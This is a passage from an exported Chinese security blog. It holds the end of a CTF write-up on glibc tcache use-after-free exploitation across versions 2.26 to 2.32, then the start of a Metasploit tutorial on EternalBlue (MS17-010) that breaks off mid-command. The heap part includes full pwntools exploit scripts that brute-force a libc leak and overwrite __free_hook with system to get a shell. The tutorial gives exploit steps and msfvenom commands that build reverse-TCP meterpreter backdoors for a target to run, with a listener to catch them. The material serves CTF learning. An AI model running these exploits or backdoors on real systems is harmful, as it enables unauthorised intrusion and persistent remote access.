            goto errout;\n            }\n            set_inuse_bit_at_offset (victim, nb);\n            bin->bk = bck;\n            bck->fd = bin;\n\n            if (av != &main_arena)\n                set_non_main_arena (victim);\n            check_malloced_chunk (av, victim, nb);\n            #if USE_TCACHE\n            /* While we're here, if we see other chunks of the same size,\n\t     stash them in the tcache.  */\n            size_t tc_idx = csize2tidx (nb);\n            if (tcache && tc_idx < mp_.tcache_bins)\n            {\n                mchunkptr tc_victim;\n\n                /* While bin not empty and tcache not full, copy chunks over.  */\n                while (tcache->counts[tc_idx] < mp_.tcache_count\n                       && (tc_victim = last (bin)) != bin)\n                {\n                    if (tc_victim != 0)\n                    {\n                        bck = tc_victim->bk;\n                        set_inuse_bit_at_offset (tc_victim, nb);\n                        if (av != &main_arena)\n                            set_non_main_arena (tc_victim);\n                        bin->bk = bck;\n                        bck->fd = bin;\n\n                        tcache_put (tc_victim, tc_idx);\n                    }\n                }\n            }\n            #endif\n            void *p = chunk2mem (victim);\n            alloc_perturb (p, bytes);\n            return p;\n        }\n    }\n}\n\n```\n\n可以看到几乎是一样的，只有一两处：\n\nA.2.26判断了smallbin是否为空，为空则会调用**malloc_consolidate**进行初始化，但是从2.27开始就没有了。这个在针对**malloc_consolidate**进行攻击的时候可能会用到。\n\nB.错误打印方式不同：\n\n```c\n//2.26\nerrstr = \"malloc(): smallbin double linked list corrupted\";\ngoto errout;\n\n//errout define 2 time\nerrout:\n    if (!have_lock && locked)\n        __libc_lock_unlock (av->mutex);\n    malloc_printerr (check_action, errstr, chunk2mem (p), av);\n    return;\n}\n\nerrout:\n    malloc_printerr (check_action, errstr, chunk2mem (oldp), av);\n    return NULL;\n}\n\n//2.27及以上\nmalloc_printerr (\"malloc(): smallbin double linked list corrupted\");\n```\n\n这个在针对**malloc_printerr**也可能会用到\n\n而这种攻击主要是针对smallbin攻击的。\n\n但也有一种针对fastbin攻击的：\n\n[Tcache Stashing Unlink Attack利用思路 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/198173)\n\n这个后面再讨论下。\n\n## 2.UAF常见限制\n\n### (1)UAF + Leak + Size不做限制：\n\n这个没啥好说的，直接泄露地址之后任意申请就完了。\n\n### (2)UAF+Leak+Size做限制:\n\n结合之前的，小Chunk就修改size，可以放入unsortedbin就填满Tcache之后放入泄露地址后任意申请即可。\n\n### (3)UAF+无Leak+Size不做限制:\n\n一般很多tcache的题都会对size做限制，但是其实对于tcache的UAF来说，没啥大用，都能绕过，像我下面对于0x4f8的chunk就可以利用修改size来伪造，和之前基本一致。\n\n由于tcache没什么限制，我们可以利用unsortedbin踩下地址后，对应修改fd即可实现爆破申请_IO_2_1_stdout结构体，修改flag和部分字节写write_base,write_end来泄露地址，然后就可以任意申请了。\n\n```python\ndef pwn():\n\tglobal p\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\tadd_malloc(0x1000-0x8-0x250,'PIG007NB')\n\n\n\tguess_libc = 0xf000\n\tguess_heap = 0xf000\n\tguess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']\n\tlg(\"guess_IO\",guess_IO)\n\t\n\tadd_malloc(0x4f8,\"\\x00\"*0x4f8)\t\t\t\t#idx\t0x1\n\t\n\tadd_malloc(0x38,\"\\x01\"*0x38)\t\t\t\t#idx\t0x2\n\tadd_malloc(0x38,\"\\x02\"*0x38)\t\t\t\t#idx\t0x3\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0x4\n\tadd_malloc(0x38,'\\x04'*0x38)\t\t\t\t#idx\t0x5\n\n\n\t#write libc addr\n\tfree(0x1)\n\tadd_malloc(0x78,p16((guess_IO)&0xffff))\t\t\t\t#idx \t0x6\n\t#show(0x1)\n\t#libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])\n\t#lg(\"libc_base_attempt\",libc_base_attempt)\n\t\n\tfree(0x2)\n\tfree(0x4)\n\tedit(0x4,0x2,p16((guess_heap+0x1000+0x10)&0xffff))\n\n\n\tadd_malloc(0x38,'\\x05'*0x38)\t\t\t\t\t\t#idx\t0x7\n\tadd_malloc(0x38,'\\x06'*0x38)\t\t\t\t\t\t#idx\t0x8\n\tadd_malloc(0x38,p64(0xfbad1800) + p64(0)*3 + '\\x00')#idx\t0x9\n\t\n\tlibc_base = u64Leakbase(0x3b5890)\n\tlg(\"libc_base\",libc_base)\n\n\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xa\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xb\n\tfree(0xa)\n\tfree(0xb)\n\tedit(0xb,0x8,p64(libc_base+libc.sym['__free_hook']))\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xc\n\tadd_malloc(0x48,p64(libc_base + libc.sym['system']))#idx \t0xd\n\tfree(0xc)\n\tit()\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n当然这种解法有点没效率，因为需要同时爆破Libc和heap的各半个字节，总共一个字节，总的来说数学期望为1/256。但是观察上面我们可以看到由于tcache机制，同处于0x100一个内存页下的Chunk前面的都一样，不用爆破，那么只需要修改最后一个字节即可完成tcache链表的修改，这样爆破的期望就下降到了半个字节，数学期望1/16，明显提升了很大效率，比赛时直冲一血，嘿嘿：\n\n```python\n#注释头\n\ndef pwn():\n\tglobal p\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\tadd_malloc(0x1000-0x8-0x250,'PIG007NB')\n\n\n\tguess_libc = 0xd000\n\tguess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']\n\tlg(\"guess_IO\",guess_IO)\n\t\n\ttcacheMalloc(0x98) \t\t#idx 0x1~0x7\n\tadd_malloc(0x98,\"\\x00\"*0x98)\t\t\t\t#idx\t0x8\n\t\n\tadd_malloc(0x98,\"\\x00\"*0x98)\t\t\t\t#idx\t0x9\n\n\n\tadd_malloc(0x38,\"\\x01\"*0x38)\t\t\t\t#idx\t0xa\n\tadd_malloc(0x38,\"\\x02\"*0x38)\t\t\t\t#idx\t0xb\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0xc\n\tadd_malloc(0x38,'\\x04'*0x38)\t\t\t\t#idx\t0xd\n\n\n\t#write libc addr\n\ttcacheDelete(0x1)\n\tfree(0x9)\n\tadd_malloc(0x38,p16((guess_IO)&0xffff))\t\t\t\t#idx \t0xe\n\t#show(0x1)\n\t#libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])\n\t#lg(\"libc_base_attempt\",libc_base_attempt)\n\t\n\t#change 0x40 link_list\n\tfree(0xa)\n\tfree(0xc)\n\tedit(0xc,0x1,'\\x10')\n\t\n\tadd_malloc(0x38,'\\x05'*0x38)\t\t\t\t\t\t#idx\t0xf\n\tadd_malloc(0x38,'\\x06'*0x38)\t\t\t\t\t\t#idx\t0x10\n\tadd_malloc(0x38,p64(0xfbad1800) + p64(0)*3 + '\\x00')#idx\t0x11\n\t\n\tlibc_base = u64Leakbase(0x3b5890)\n\tlg(\"libc_base\",libc_base)\n\n\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x12\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x13\n\tfree(0x12)\n\tfree(0x13)\n\tedit(0x13,0x8,p64(libc_base+libc.sym['__free_hook']))\n\t\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x14\n\tadd_malloc(0x48,p64(libc_base + libc.sym['system']))#idx \t0x15\n\tfree(0x14)\n\tit()\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n▲爆破题外话：之前没怎么发现，这里发现PIE+ASLR出来的Libc地址开头可能是0x7e，而且中间也有可能会出现\\x00的情况，这样就很容易使得我们爆破的次数直线上涨，所以在调试好了之后，爆破会加入\n\n```python\n#注释头\n\ncontext.timeout = 0.5\n#----------------------------------------------------------------------\nexcept Exception:\n    p.close()\n\tcontinue\n```\n\n来简单对抗这两种变化，防止爆破中断。\n\n### (4)UAF+无Leak+Size做限制:\n\n一般很多tcache的题都会对size做限制，要么小，要么大。但是其实对于tcache的UAF来说，没啥大用，都能绕过，不像fastbin一样，需要在目的地址伪造size。所以这里基本上修改一下size都可以得到对应解法，这种题目更多应该是考察堆布局的能力。需要有一个对于所有chunk进行布局的能力，最好准备草稿纸写写画画(excel也行).....\n\n\n\n# 六、Glibc2.31\n\n## 1.部分手段失效\n\n### (1)原始largebin attack失效\n\n从2.30开始将从unsortebin放入largebin的代码中在size比较的其中一个分支新增检查：\n\n```c\n//注释头\n\n//unsortedbin chunk->size < largebin chunk->size\nif ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))\n{\n    fwd = bck;\n    bck = bck->bk;\n    victim->fd_nextsize = fwd->fd;\n    victim->bk_nextsize = fwd->fd->bk_nextsize;\n    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;\n}\nelse //unsortedbin chunk->size >= largebin chunk->size\n{\n    assert (chunk_main_arena (fwd));\n    while ((unsigned long) size < chunksize_nomask (fwd))\n    {\n        fwd = fwd->fd_nextsize;\n        assert (chunk_main_arena (fwd));\n    }\n\n    if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd))\n    /* Always insert in the second position.  */\n    \tfwd = fwd->fd;\n    else\n    {\n        victim->fd_nextsize = fwd;\n        victim->bk_nextsize = fwd->bk_nextsize;\n        if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n        \tmalloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n        fwd->bk_nextsize = victim;\n        victim->bk_nextsize->fd_nextsize = victim;\n    }\n    bck = fwd->bk;\n    if (bck->fd != fwd)\n    \tmalloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n}\n\n```\n\n即当发生从unsortedbin中转移到largbin中时，如果unsortedbin中要转移的chunk的size大于largebin中原本就有的尾部chunk的size，就会触发新增的检查。否则，则不会触发新增的检查。\n\n而新增检查的意思其实就是检查双向链表的完整性，这和之前unsortedbin失效加入的检查如出一辙。\n\n```C\n//注释头\n\nif (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n    malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n```\n\n```C\n//注释头\n\nif (bck->fd != fwd)\n    malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n```\n\n但是由于当size小于的时候没有检查，所以largebin attack还是可以用的，只要unsortedbin中要放入largebin中的chunk的size小于largebin中chunk的size即可，但是这里的largebin attack已经被降级，相比之前的两个地址任意写，限制只能写一个地址了。\n\n### (2)Tcache结构扩大\n\n之前版本的tcache中count一直是一个字节，这回从2.30开始就变成了两个字节：\n\n```c\n//注释头\n\n//2.29\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n\n//2.30\ntypedef struct tcache_perthread_struct\n{\n  uint16_t counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n```\n\n所以tcache的结构体也从0x250扩大为0x290\n\n### (3)删除了一些assert\n\n在2.30版本及之后，删除了一些有关tcache的assert\n\n```c\n//注释头\n\n//2.29\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n\n//2.30\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n\n//2.29\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n\n//2.30\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n```\n\n以前就想着是不是能像控fastbinY溢出一样来控tcache溢出呢，但在2.29及以前肯定是不行的，因为有assert存在。就算修改了mp_.tcache_bins，成功进入tcache_put也会因为assert(tc_idx<TCACHE_MAX_BINS)的断言使得程序退出。\n\n```c\n//注释头\n\nif (tcache && tc_idx < mp_.tcache_bins)\n{\n    mchunkptr tc_victim;\n    /* While bin not empty and tcache not full, copy chunks.  */\n    while (tcache->counts[tc_idx] < mp_.tcache_count\n           && (tc_victim = *fb) != NULL)\n    {\n        if (SINGLE_THREAD_P)\n            *fb = tc_victim->fd;\n        else\n        {\n            REMOVE_FB (fb, pp, tc_victim);\n            if (__glibc_unlikely (tc_victim == NULL))\n                break;\n        }\n        tcache_put (tc_victim, tc_idx);\n    }\n}\n\nif (tc_idx < mp_.tcache_bins\n      && tcache\n      && tcache->counts[tc_idx] > 0)\n{\n    return tcache_get (tc_idx);\n}\n```\n\n但是新版本删去了这个操作，那么如果我们能够修改mp_.tcache_bins，就将能够调用tcache_put函数，将tcache结构体往后溢出，就像修改global_max_fast一样，实在是有点逗，不知道为什么新版本要删掉，这个就引入了一种新的方法：[glibc 2.27-2.32版本下Tcache Struct的溢出利用 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/235821)。这个我个人还是觉得这位师傅讲的还是有点出入，因为是2.30才删去的，2.29及以前是不存在这种方法的，包括用2.29调试也是的。\n\n### (4)对count新增了一些限制\n\n```C\n//2.29\nif (tc_idx < mp_.tcache_bins\n    /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */\n    && tcache\n    && tcache->entries[tc_idx] != NULL)\n{\n    return tcache_get (tc_idx);\n}\n\n//2.30\nif (tc_idx < mp_.tcache_bins\n    && tcache\n    && tcache->counts[tc_idx] > 0)\n{\n    return tcache_get (tc_idx);\n}\n```\n\n从2.30开始在`_libc_malloc`中准备从tcache中申请时，会判断`counts[tc_idx]`是否大于0，不大于0则不会从tcache中申请。所以有时候我们使用直接修改fd的办法需要考虑到数量是否会被清0。但是在`_int_free`中却没有新增类似的检查。\n\n\n\n## 2.UAF常见限制\n\n### (1)UAF+Leak+Size不做限制:\n\n这里也不需要多讲，放入unsortedbin后直接泄露地址之后任意申请就完了。\n\n### (2)UAF+Leak+Size做限制:\n\n结合之前的，小Chunk就修改size，可以放入unsortedbin的就填满Tcache之后放入泄露地址后任意申请即可。\n\n### (3)UAF+无Leak+Size不做限制:\n\n其实和2.29差不多，只是失效了一些手段，比如传统的largebin attack失效。而之前在2.29中讲到的相关方法其实也一样可以直接用上。爆破_IO_2_1_stdout泄露地址，之后任意申请修改__free_hook即可。\n\n### (4)UAF+无Leak+Size做限制:\n\n同样还是需要通过堆布局来修改size，制造unsortedbin chunk。\n\n# 七、Glibc2.32\n\n## 1.新增机制\n\n### (1)Tcache和Fastbin新增指针异或检查的safe-linking机制\n\n#### ①引入一个宏定义\n\n```c\n#define PROTECT_PTR(pos, ptr) \\\n  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))\n#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)\n```\n\n即将传入的pos右移12bit后和ptr异或。\n\n#### ②实际应用\n\n##### Tcache中\n\n```c\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n    /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n    e->key = tcache;\n\n    e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);\n    tcache->entries[tc_idx] = e;\n    ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    if (__glibc_unlikely (!aligned_OK (e)))\n        malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n    tcache->entries[tc_idx] = REVEAL_PTR (e->next);\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n\n```\n\n##### Fastbin中\n\n```c\nif (SINGLE_THREAD_P)\n{\n    /* Check that the top of the bin is not the record we are going to\n   add (i.e., double free).  */\n    if (__builtin_expect (old == p, 0))\n        malloc_printerr (\"double free or corruption (fasttop)\");\n    p->fd = PROTECT_PTR (&p->fd, old);\n    *fb = p;\n}\nelse\n    do\n    {\n        /* Check that the top of the bin is not the record we are going to\n     add (i.e., double free).  */\n        if (__builtin_expect (old == p, 0))\n            malloc_printerr (\"double free or corruption (fasttop)\");\n        old2 = old;\n        p->fd = PROTECT_PTR (&p->fd, old);\n    }\nwhile ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))\n       != old2);\n```\n\n再加上其他\n\n```c\np->fd = PROTECT_PTR (&p->fd, old);\n//----------------------------------------\np = REVEAL_PTR (p->fd);\n//----------------------------------------\ntcache_tmp->entries[i] = REVEAL_PTR (e->next);\n//----------------------------------------\n*fb = REVEAL_PTR (victim->fd);\n//----------------------------------------\n*fb = REVEAL_PTR (tc_victim->fd);\n//----------------------------------------\ntmp = REVEAL_PTR (tmp->next))\n//----------------------------------------\nnextp = REVEAL_PTR (p->fd);\n```\n\n```c\n#define REMOVE_FB(fb, victim, pp)\t\t\t\\\ndo\t\t\t\t\t\t\t\\\n{\t\t\t\t\t\t\t\\\n\tvictim = pp;\t\t\t\t\t\\\n\tif (victim == NULL)\t\t\t\t\\\n\tbreak;\t\t\t\t\t\t\\\n\tpp = REVEAL_PTR (victim->fd);                                     \\\n\tif (__glibc_unlikely (pp != NULL && misaligned_chunk (pp)))       \\\n\tmalloc_printerr (\"malloc(): unaligned fastbin chunk detected\"); \\\n}\t\t\t\t\t\t\t\\\nwhile ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \\\n\t != victim);\t\t\t\t\t\\\n```\n\n等多多少少用到tcache和fastbin的地方。而unsortebin、largebin、smallbin都不会进行相关指针异或。\n\n### (2)新增机制Safe-linking的漏洞\n\n#### ①规律性\n\n官方说的是\n\n```\n/* Safe-Linking:\nUse randomness from ASLR (mmap_base) to protect single-linked lists\nof Fast-Bins and TCache.  That is, mask the \"next\" pointers of the\nlists' chunks, and also perform allocation alignment checks on them.\nThis mechanism reduces the risk of pointer hijacking, as was done with\nSafe-Unlinking in the double-linked lists of Small-Bins.\nIt assumes a minimum page size of 4096 bytes (12 bits).  Systems with\nlarger pages provide less entropy, although the pointer mangling\nstill works.  */\n```\n\n基于ASLR之后的堆地址，即Key值为第一个进入该大小TcacheBin链的chunk的地址右移12bit得到，对于Fastbin也是一样的。\n\n![Snipaste_2021-08-25_19-54-16](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210826213422.png)\n\n#### ②特殊性\n\n虽说FD被加密，但是由于是异或的关系，在UAF的特殊条件下其实是可以控制FD指向其他堆块的。\n\n比如说我们进行一定的堆布局，尝试将堆块集中在0x100内，然后可以爆破1个字节来进行计算：\n\n![Snipaste_2021-08-25_17-50-30](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210826213439.png)\n\n这里就chunk4->chunk3->chunk2->chunk1。\n\n这里就假设我们爆破1字节后已经知道了heapbase/0x1000左移12bit的最后一个字节为0x59。现在进行计算一下，如果我们想把chunk4的FD指向chunk1在没有Leak的情况下应该怎么修改？\n\n计算0x10^0x59=0x49，所以如果我们利用UAF部分写chunk4的FD的第一个字节为0x49，那么实际上其实指向的就是chunk1。这个在没有泄露地址而Size又做限制导致只能用Fastbin和Tcache时，可以采用这种方法爆破。所以实际上的期望应该是1/256，这个尝试一下应该就可以实现的。\n\n### (3)新增Tcache地址对齐检查\n\n#### ①tcache_get中\n\n```c\n//2.32\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    if (__glibc_unlikely (!aligned_OK (e)))\n        malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n    tcache->entries[tc_idx] = REVEAL_PTR (e->next);\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n\n//2.31\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    tcache->entries[tc_idx] = e->next;\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n```\n\n可以看到在tcache_get中新增了一个检查\n\n```C\nif (__glibc_unlikely (!aligned_OK (e)))\n    malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n```\n\n这个导致了我们的tcache不能任意申请了，**必须是0x10对齐的**，这个可能会导致不少的手段变化。\n\n#### ②tcache结构释放函数中\n\n```c\ntcache_thread_shutdown (void)\n{\n    int i;\n    tcache_perthread_struct *tcache_tmp = tcache;\n\n    if (!tcache)\n        return;\n\n    /* Disable the tcache and prevent it from being reinitialized.  */\n    tcache = NULL;\n    tcache_shutting_down = true;\n\n    /* Free all of the entries and the tcache itself back to the arena\n     heap for coalescing.  */\n    for (i = 0; i < TCACHE_MAX_BINS; ++i)\n    {\n        while (tcache_tmp->entries[i])\n        {\n            tcache_entry *e = tcache_tmp->entries[i];\n            if (__glibc_unlikely (!aligned_OK (e)))\n                malloc_printerr (\"tcache_thread_shutdown(): \"\n                                 \"unaligned tcache chunk detected\");\n            tcache_tmp->entries[i] = REVEAL_PTR (e->next);\n            __libc_free (e);\n        }\n    }\n\n    __libc_free (tcache_tmp);\n}\n```\n\n```c\nif (__glibc_unlikely (!aligned_OK (e)))\n    malloc_printerr (\"tcache_thread_shutdown(): \"\n                     \"unaligned tcache chunk detected\");\n```\n\n即当程序退出，释放tcache结构体时会加入对tcache中所有chunk进行地址对齐检查，但是这个对exit()的攻击没什么影响。\n\n#### ③Tcache中double free检查中\n\n```c\nif (__glibc_unlikely (e->key == tcache))\n{\n    tcache_entry *tmp;\n    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\n    for (tmp = tcache->entries[tc_idx];\n         tmp;\n         tmp = REVEAL_PTR (tmp->next))\n    {\n        if (__glibc_unlikely (!aligned_OK (tmp)))\n            malloc_printerr (\"free(): unaligned chunk detected in tcache 2\");\n        if (tmp == e)\n            malloc_printerr (\"free(): double free detected in tcache 2\");\n        /* If we get here, it was a coincidence.  We've wasted a\n\t   few cycles, but don't abort.  */\n    }\n}\n```\n\n```c\nif (__glibc_unlikely (!aligned_OK (tmp)))\n    malloc_printerr (\"free(): unaligned chunk detected in tcache 2\");\n```\n\n当tcache进行Free的double free检查时，如果tcache中第一个bin的chunk地址不对齐，也会错误。其实最开始不太理解，想这能有啥用，最开始Free的时候不就已经进行地址对齐检查了吗。后面想到由于stashing机制，可能会将地址不合法的Chunk放入到tcache中，所以再进行对应Bin大小的chunk释放时，进行检查提高安全性吧。**这个我们在利用的时候也需要注意下，别到时候得到了用Stashing机制放入一个不合法chunk之后再free导致程序出错了。**\n\n想感叹一下，在2.31及以下版本，只有在_int_free函数中才有一个地址对齐检查，这2.32突然加了好几个，真是挺猛的。\n\n\n\n## 2.UAF常见限制\n\n### (1)UAF+Leak+Size不做限制:\n\n这个如上图中就可以直接leak出chunk1的内容得到key，然后释放unsortedbin chunk泄露libc地址后，利用key异或对应地址即可任意申请。\n\n### (2)UAF+Leak+Size做限制:\n\n一样的，Leak出key之后，修改size得到unsortedbin chunk之后泄露libc地址，异或改掉FD任意申请chunk。\n\n### (3)UAF+无Leak+Size做限制:\n\n这条件下的想半天实在没想出来，爆破两个字节倒是可以申请到Tcache结构体，但是两个字节的期望却达到了0xffff=65535，实际的线上CTF中可能爆出来黄花菜都凉了。\n\n▲爆破两字节申请Tcache Struct：\n\n比如我们先爆破一个字节，使得heapbase的地址为0xabcde5500000\n\n然后我们按照上述方法，用一定堆布局，计算一下地址\n\n异或之后的地址应该为：\n\n```c\nchunk1:\t\t\t\t0xabcde5500400 ^ 0xabcde5500 = 0x--(0x0400^0x5500)\nTcacheStruct:\t\t0xabcde5500000 ^ 0xabcde5500 = 0x--(0x0000^0x5500)\n```\n\n那么就可以直接该指向chunk1地址的最后两个字节为5500即可指向Tcache结构体，然后释放进入unsortedbin踩下libc地址再爆破申请stdout泄露地址，这样又会出来半个字节爆破空间。即0xfffff=1048575，直接GG。\n\n▲size做限制其实没差别，可以爆破一个字节来修改的。\n\n\n\n# 总结\n\n这次总结堆利用方法让我也学到了好多，翻了好多源码，很多以前不明所以的东西翻了相关源码之后感觉一下子就清楚了。\n\n这篇文章持续更新，以后再发现有意思的地方再回来更新。\n\n当然，UAF其实是特别好利用的一种，高版本下也对应有很多的骚操作，比如\n\n`house of pig` :[house of pig一个新的堆利用详解 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/242640)\n\n`house of banana` :[house of banana - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/222948)\n\n等等现在大多的题目都是off by null + 堆布局，尤其是堆布局这一块，实在是无比考验对堆的理解，因为万一其中哪个地方想错，直接就得推倒重来。\n\n后面找时间再总结下off by null吧。\n\n","tags":["Heap"],"categories":["PWN","pwn堆-UAF"]},{"title":"1.metasploit-win7永恒之蓝-ms17_010复现","url":"/2021/08/19/1.metasploit-win7永恒之蓝-ms17_010复现/","content":"\n开了防火墙的话可能都ping不通，需要各种绕过\n\n一、前期工作：\n\n1.首先信息收集，获取真实IP，然后扫描，很多种，参数太多：\n\nnmap -O -p445 ip：检查是否开启445端口及主机操作系统\n\ndb_nmap -sT -T4 ip：快速扫描，db是database\n\n2.然后看有没有漏洞，需要对漏洞有一定掌握\n\n3.在metasploit下查找漏洞的使用模块和扫描模块等，下面利用win7的永恒之蓝漏洞：\n\nsearch ms17_011：查找该漏洞的相关\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510199.png)\n\n4.先使用该模块扫描看看有没有该漏洞：\n\n(1)进入模块并且配置模块信息：\n\nuse auxiliary/scanner/smb/smb_ms17_010\n\nshow options\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509941.png)\n\nset RHOSTS ip\n\n(2)使用该模块来扫描：\n\nrun或者exploit\n\n \n\n检测到可能有，那么使用攻击模块：\n\n5.使用攻击模块进行攻击：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509097.png)\n\nset RHOSTS ip\n\nexploit\n\n6.得到目的主机的shell：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509506.png)\n\n7.为了不乱码，设置编码格式为utf-8：\n\nchcp 65001\n\n8.调换至后台，输入sessions可以查看，sessions id可以进入：\n\nbackground\n\nsessions\n\nsessions id\n\n9.为了更好利用，调换至meterpreter模式：\n\nsessions -u 1\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509822.png)\n\n \n\n \n\n二、生成后门程序传到在目标机器上，这样下回目标机器运行该程序，主机监听到之后就可以直接进入了，不管漏洞在不在。\n\n1.生成后门程序：\n\n①msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f exe > localmsf8881.exe\n\n②msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f raw > localmsf8881.py\n\n③msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f raw > localmsf8881.php\n\n可以生成很多种后门程序，只要在目标机器上运行，那么就可以利用\n\n2.本机上使用模块，设置payload和监听端口：\n\nuse exploit/multi/handler\n\nset payload windows/meterpreter/reverse_tcp\n\nset LHOST 192.168.80.158\n\nset LPORT 